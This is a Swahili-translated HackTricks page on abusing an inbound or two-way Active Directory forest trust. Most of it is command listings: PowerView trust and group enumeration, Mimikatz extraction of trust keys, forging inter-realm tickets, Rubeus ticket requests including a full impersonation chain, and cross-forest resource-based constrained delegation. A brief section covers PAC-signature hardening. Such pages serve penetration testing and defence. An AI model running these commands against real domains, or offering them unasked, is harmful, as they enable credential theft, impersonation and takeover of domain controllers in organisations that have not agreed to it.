# Domain ya Forest ya Nje - OneWay (Inbound) au ya pande mbili

{{#include ../../banners/hacktricks-training.md}}

Katika hali hii domain ya nje inakuamini (au zote mbili zinaaminiana), hivyo unaweza kupata aina fulani ya access juu yake.

## Enumeration

Kwanza kabisa, unahitaji kufanya **enumerate** **trust**:
```bash
Get-DomainTrust
SourceName      : a.domain.local   --> Current domain
TargetName      : domain.external  --> Destination domain
TrustType       : WINDOWS-ACTIVE_DIRECTORY
TrustAttributes :
TrustDirection  : Inbound          --> Inboud trust
WhenCreated     : 2/19/2021 10:50:56 PM
WhenChanged     : 2/19/2021 10:50:56 PM

# Get name of DC of the other domain
Get-DomainComputer -Domain domain.external -Properties DNSHostName
dnshostname
-----------
dc.domain.external

# Groups that contain users outside of its domain and return its members
Get-DomainForeignGroupMember -Domain domain.external
GroupDomain             : domain.external
GroupName               : Administrators
GroupDistinguishedName  : CN=Administrators,CN=Builtin,DC=domain,DC=external
MemberDomain            : domain.external
MemberName              : S-1-5-21-3263068140-2042698922-2891547269-1133
MemberDistinguishedName : CN=S-1-5-21-3263068140-2042698922-2891547269-1133,CN=ForeignSecurityPrincipals,DC=domain,
DC=external

# Get name of the principal in the current domain member of the cross-domain group
ConvertFrom-SID S-1-5-21-3263068140-2042698922-2891547269-1133
DEV\External Admins

# Get members of the cros-domain group
Get-DomainGroupMember -Identity "External Admins" | select MemberName
MemberName
----------
crossuser

# Lets list groups members
## Check how the "External Admins" is part of the Administrators group in that DC
Get-NetLocalGroupMember -ComputerName dc.domain.external
ComputerName : dc.domain.external
GroupName    : Administrators
MemberName   : SUB\External Admins
SID          : S-1-5-21-3263068140-2042698922-2891547269-1133
IsGroup      : True
IsDomain     : True

# You may also enumerate where foreign groups and/or users have been assigned
# local admin access via Restricted Group by enumerating the GPOs in the foreign domain.

# Additional trust hygiene checks (AD RSAT / AD module)
Get-ADTrust -Identity domain.external -Properties SelectiveAuthentication,SIDFilteringQuarantined,SIDFilteringForestAware,TGTDelegation,ForestTransitive
```
> `SelectiveAuthentication`/`SIDFiltering*` hukuruhusu kuona haraka ikiwa njia za cross-forest abuse (RBCD, SIDHistory) zina uwezekano wa kufanya kazi bila mahitaji ya ziada.<sup>[[2]](#references)</sup>

Katika enumeration ya awali iligunduliwa kuwa user **`crossuser`** yuko ndani ya group ya **`External Admins`**, ambayo ina **Admin access** ndani ya **DC ya external domain**.

## Ufikiaji wa Awali

Ikiwa **hukuweza** kupata access yoyote **maalum** ya user wako katika domain nyingine, bado unaweza kurudi kwenye AD Methodology na kujaribu kufanya **privesc kutoka kwa user asiye na privilege** (kwa mfano, mambo kama kerberoasting):

Unaweza kutumia **Powerview functions** kufanya **enumerate** **domain nyingine** kwa kutumia param ya `-Domain`, kama katika:
```bash
Get-DomainUser -SPN -Domain domain_name.local | select SamAccountName
```
{{#ref}}
./
{{#endref}}

## Impersonation

### Kuingia

Kwa kutumia njia ya kawaida pamoja na credentials za users wenye access ya external domain, unapaswa kuweza kupata access:
```bash
Enter-PSSession -ComputerName dc.external_domain.local -Credential domain\administrator
```
### SID History Abuse

Unaweza pia kutumia vibaya [**SID History**](sid-history-injection.md) kote kwenye forest trust.

Mtumiaji akihamishwa **kutoka forest moja kwenda nyingine** na **SID Filtering haijawezeshwa**, inawezekana **kuongeza SID kutoka forest nyingine**, na **SID** hii **itaongezwa** kwenye **token ya mtumiaji** wakati wa ku-authenticate **kupitia trust**.

> [!WARNING]
> Kwa ukumbusho, unaweza kupata signing key kwa kutumia
>
> ```bash
> Invoke-Mimikatz -Command '"lsadump::trust /patch"' -ComputerName dc.domain.local
> ```

Unaweza **kusaini kwa kutumia** key ya **trusted** **TGT inayomwakilisha** mtumiaji wa domain ya sasa.
```bash
# Get a TGT for the cross-domain privileged user to the other domain
Invoke-Mimikatz -Command '"kerberos::golden /user:<username> /domain:<current domain> /SID:<current domain SID> /rc4:<trusted key> /target:<external.domain> /ticket:C:\path\save\ticket.kirbi"'

# Use this inter-realm TGT to request a TGS in the target domain to access the CIFS service of the DC
## We are asking to access CIFS of the external DC because in the enumeration we show the group was part of the local administrators group
Rubeus.exe asktgs /service:cifs/dc.domain.external /domain:dc.domain.external /dc:dc.domain.external /ticket:C:\path\save\ticket.kirbi /nowrap

# Now you have a TGS to access the CIFS service of the domain controller
```
### Njia kamili ya kuiga mtumiaji
```bash
# Get a TGT of the user with cross-domain permissions
Rubeus.exe asktgt /user:crossuser /domain:sub.domain.local /aes256:70a673fa756d60241bd74ca64498701dbb0ef9c5fa3a93fe4918910691647d80 /opsec /nowrap

# Get a TGT from the current domain for the target domain for the user
Rubeus.exe asktgs /service:krbtgt/domain.external /domain:sub.domain.local /dc:dc.sub.domain.local /ticket:doIFdD[...snip...]MuSU8= /nowrap

# Use this inter-realm TGT to request a TGS in the target domain to access the CIFS service of the DC
## We are asking to access CIFS of the external DC because in the enumeration we show the group was part of the local administrators group
Rubeus.exe asktgs /service:cifs/dc.domain.external /domain:dc.domain.external /dc:dc.domain.external /ticket:doIFMT[...snip...]5BTA== /nowrap

# Now you have a TGS to access the CIFS service of the domain controller
```
### Cross-forest RBCD unapodhibiti machine account katika trusting forest (hakuna SID filtering / selective auth)

Ikiwa foreign principal (FSP) yako inakuweka katika group inayoweza kuandika computer objects katika trusting forest (kwa mfano, `Account Operators`, custom provisioning group), unaweza kusanidi **Resource-Based Constrained Delegation** kwenye target host ya forest hiyo na ku-impersonate user yeyote huko:
```bash
# 1) From the trusted domain, create or compromise a machine account (MYLAB$) you control
# 2) In the trusting forest (domain.external), set msDS-AllowedToAct on the target host for that account
Set-ADComputer -Identity victim-host$ -PrincipalsAllowedToDelegateToAccount MYLAB$
# or with PowerView
Set-DomainObject victim-host$ -Set @{'msds-allowedtoactonbehalfofotheridentity'=$sidbytes_of_MYLAB}

# 3) Use the inter-forest TGT to perform S4U to victim-host$ and get a CIFS ticket as DA of the trusting forest
Rubeus.exe s4u /ticket:interrealm_tgt.kirbi /impersonate:EXTERNAL\Administrator /target:victim-host.domain.external /protocol:rpc
```
Hii hufanya kazi tu wakati **SelectiveAuthentication imezimwa** na **SID filtering** haiondoi SID yako ya kudhibiti. Ni njia ya haraka ya lateral movement inayokwepa forging ya SIDHistory na mara nyingi hupuuzwa katika ukaguzi wa trust.<sup>[[2]](#references)</sup>

### Uimarishaji wa uthibitishaji wa PAC

Masasisho ya uthibitishaji wa sahihi ya PAC ya **CVE-2024-26248**/**CVE-2024-29056** yanaongeza utekelezaji wa kusaini kwenye tickets za inter-forest. Katika **Compatibility mode**, njia za forged za inter-realm PAC/SIDHistory/S4U bado zinaweza kufanya kazi kwenye DC ambazo hazijapatchiwa. Katika **Enforcement mode**, data ya PAC isiyotiwa sahihi au iliyobadilishwa inayovuka forest trust hukataliwa isipokuwa pia uwe na trust key ya forest lengwa. Registry overrides (`PacSignatureValidationLevel`, `CrossDomainFilteringLevel`) zinaweza kudhoofisha hili wakati bado zinapatikana.<sup>[[1]](#references)</sup>

## References

- [1] [Microsoft KB5037754 – Mabadiliko ya uthibitishaji wa PAC kwa CVE-2024-26248 na CVE-2024-29056](https://support.microsoft.com/en-au/topic/how-to-manage-pac-validation-changes-related-to-cve-2024-26248-and-cve-2024-29056-6e661d4f-799a-4217-b948-be0a1943fef1)
- [2] [Maelezo ya MS-PAC – Maelezo ya SID filtering na claims transformation](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-pac/55fc19f2-55ba-4251-8a6a-103dd7c66280)
{{#include ../../banners/hacktricks-training.md}}
